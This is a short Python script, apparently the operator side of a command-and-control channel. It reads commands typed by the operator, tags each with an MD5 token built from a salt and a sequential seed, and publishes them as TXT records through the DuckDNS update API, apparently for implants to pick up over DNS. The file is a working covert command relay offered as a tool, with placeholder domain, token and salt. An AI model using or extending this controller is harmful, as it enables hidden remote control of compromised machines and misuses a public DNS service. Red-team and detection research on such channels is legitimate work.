import random
import hashlib
import requests


def tokenGenerator():
    seed = random.getrandbits(32)
    salt = "<SALT>" # Change this

    while True:
        plaintext = salt + str(seed)
        hash = hashlib.md5(plaintext.encode()).hexdigest()
        yield hash
        seed += 1

tokenGen = tokenGenerator()
# print(next(tokenGen))

domain = "<DOMAIN>" # change this
dnsToken = "<TOKEN-TOKEN-TOKEN-TOKEN>" # change this

def updateC2(domain, cmd):
    token = next(tokenGen)
    payload = token + ";" + cmd
    rq = requests.get("https://www.duckdns.org/update?domains=%s&token=%s&txt=%s&verbose=true" % (domain, dnsToken, payload))
    print(rq.content.decode())
    # print("DEBUG # https://www.duckdns.org/update?domains=%s&token=%s&txt=%s" % (domain, dnsT$
    # print("DEBUG # command sent: %s" % payload)

while True:
    cmd = input("Provide a command >>>")
    updateC2(domain, cmd)
